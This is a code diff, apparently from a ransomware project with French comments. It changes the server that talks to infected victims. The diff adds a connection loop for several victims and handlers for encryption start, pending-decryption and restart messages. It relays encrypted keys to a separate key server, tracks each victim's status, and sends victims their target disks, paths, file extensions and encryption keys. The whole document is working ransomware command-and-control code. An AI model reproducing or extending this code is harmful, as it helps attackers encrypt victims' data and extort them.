@@ -33,9 +33,9 @@ def main():
     print("[Serveur frontal] - Serveur de clés connecté.")
     queue_principale.task_done()  # Libère le thread srv clés
     s_serveur = network.start_net_serv( port=PORT_RANSOMWARE)
-    conn_victim, address_victim = s_serveur.accept()
-    print(f"[Serveur frontal] : Connexion d'un ransomware {address_victim} a été établie.")
     while True:
+        conn_victim, address_victim = s_serveur.accept()
+        print(f"[Serveur frontal] : Connexion d'un ransomware {address_victim} a été établie.")
         q_multi_ransomware = queue.Queue()  # Queue FIFO réponse victime
         # Démarrage du Thread de communication avec le ransomware
         t_victims = Thread(target=thread_ransomware, args=(conn_victim,queue_principale, q_multi_ransomware,),daemon=True)
@@ -49,7 +49,8 @@ def thread_srv_cles(queue_principale):
     queue_principale.join()  # Attend que le main lance l'écoute des ransomwares
 
     while True:
-        msg = queue_principale.get()  # Réceptionne les msg en queue reçu des ransomware
+        msg = queue_principale.get()
+        print("message thread serv clé : " + str(msg))# Réceptionne les msg en queue reçu des ransomware
         # on execute pas le code tant qu'on recoit pas de message_ransomware
         # Retire la queue FIFO du ransomware où envoyer la réponse
         if 'queue' in msg.keys():
@@ -59,6 +60,26 @@ def thread_srv_cles(queue_principale):
         if msg_type == 'CRYPT_START':
             msg = security.aes_encrypt(msg, aes_key)
             network.send_message(s_srv_cles, msg)
+        if msg_type == 'RESTART_REQ':
+            msg = security.aes_encrypt(msg, aes_key)
+            network.send_message(s_srv_cles, msg)
+            msg = network.receive_message(s_srv_cles)
+            msg = security.aes_decrypt(msg, aes_key)
+            msg_type = message.get_message_type(msg)
+            if msg_type == 'RESTART_RESP':
+                print(f"L'ID de la nouvelle victime est : {msg['RESTART_RESP']}")
+                print(f"Sa clé de chiffrement est :")
+                print(f"{msg['KEY']}")
+                q_reponse.put(msg)
+        if msg_type == "PENDING_MSG":
+            msg = security.aes_encrypt(msg, aes_key)
+            network.send_message(s_srv_cles, msg)
+            msg = network.receive_message(s_srv_cles)
+            print("recoit decrypt")
+            msg = security.aes_decrypt(msg, aes_key)
+            msg_type = message.get_message_type(msg)
+            q_reponse.put(msg)
+            print("l'envoie au thread rans")
         if msg_type == 'INITIALIZE_REQ':
             msg = security.aes_encrypt(msg, aes_key)
             network.send_message(s_srv_cles, msg)
@@ -74,10 +95,11 @@ def thread_srv_cles(queue_principale):
                 q_reponse.put(msg)
 
 
-def thread_ransomware(conn_victim,queue_principale, q_multi_ransomware):
+def thread_ransomware(conn_victim, queue_principale, q_multi_ransomware):
     while True:
         msg = network.receive_message(conn_victim)
-        if msg is None:  # La connexion a été fermée
+        if msg is None:
+            time.sleep(1)  # Ajouter un délai pour éviter le bouclage rapide
             break
         else:
             msg_type = message.get_message_type(msg)
@@ -96,16 +118,40 @@ def thread_ransomware(conn_victim,queue_principale, q_multi_ransomware):
                 else:
                     config_ransomware = CONFIG_WORKSTATION
                 # params ==> 0 = id, 1 = disks, 2 = paths, 3 = file_ext, 4 =freq, 5 = key
-                msg = message.set_message('initialize_resp', [key_resp['KEY_RESP'],config_ransomware['DISKS'],config_ransomware['PATHS'], config_ransomware['FILE_EXT'],config_ransomware['FREQ'],key_resp['KEY'],key_resp['STATE']])
+                msg = message.set_message('initialize_resp', [key_resp['KEY_RESP'], config_ransomware['DISKS'], config_ransomware['PATHS'], config_ransomware['FILE_EXT'], config_ransomware['FREQ'], key_resp['KEY'], key_resp['STATE']])
                 network.send_message(conn_victim, msg)
                 print("Message envoyé a la victime : " + str(msg))
-            # if msg_type == 'CRYPT_START':
-            #     msg['queue'] = q_multi_ransomware  # le message est envoyé vers la queue de chaque ransomware propre a lui
-            #     queue_principale.put(msg)
+            elif msg_type == 'CRYPT_START':
+                if msg['CRYPT'] in status_victims.keys():
+                    print(f"{msg['CRYPT']}")
+                else:
+                    status_victims[msg['CRYPT']] = 'CRYPT'
+                    print("status victims : " + str(status_victims))
+                msg['queue'] = q_multi_ransomware  # le message est envoyé vers la queue de chaque ransomware propre a lui
+                queue_principale.put(msg)
+                time.sleep(5)
+            elif msg_type == 'PENDING_MSG':
+                if msg['PENDING'] in status_victims.keys():
+                    print(f"{msg['PENDING']}")
+                else:
+                    status_victims[msg['PENDING']] = 'PENDING'
+                    print("status victims : " + str(status_victims))
+                msg['queue'] = q_multi_ransomware  # le message est envoyé vers la queue de chaque ransomware propre a lui
+                queue_principale.put(msg)
+                decrypt_resp = q_multi_ransomware.get()
+                print("recoit decrypt_resp = " + str(decrypt_resp))# Réception du msg venant du serveur de clés
+                msg = message.set_message("DECRYPT_REQ", [decrypt_resp["DECRYPT"], decrypt_resp["KEY"]])
+                network.send_message(conn_victim, msg)
+                time.sleep(5)
+            elif msg_type == 'RESTART_REQ':
+                print("Message RESTART REQ")
+                msg['queue'] = q_multi_ransomware  # le message est envoyé vers la queue de chaque ransomware propre a lui
+                queue_principale.put(msg)
+                restart_resp = q_multi_ransomware.get()
+                print(restart_resp)  # Réception du msg venant du serveur de clés
+                msg = message.set_message("RESTART_RESP", [restart_resp["RESTART_RESP"], restart_resp["KEY"]])
+                network.send_message(conn_victim, msg)
 
-
-            print('Attente de 5 secondes')
-            time.sleep(5)
 
 
 if __name__ == '__main__':
